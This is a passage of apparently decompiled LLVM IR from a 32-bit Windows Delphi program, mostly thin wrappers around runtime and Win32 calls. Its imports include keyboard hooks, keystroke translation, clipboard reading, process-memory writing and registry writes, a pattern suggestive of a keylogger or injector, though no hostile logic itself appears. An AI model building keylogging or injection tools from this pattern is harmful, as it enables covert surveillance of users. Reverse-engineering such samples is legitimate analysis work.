dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374() local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
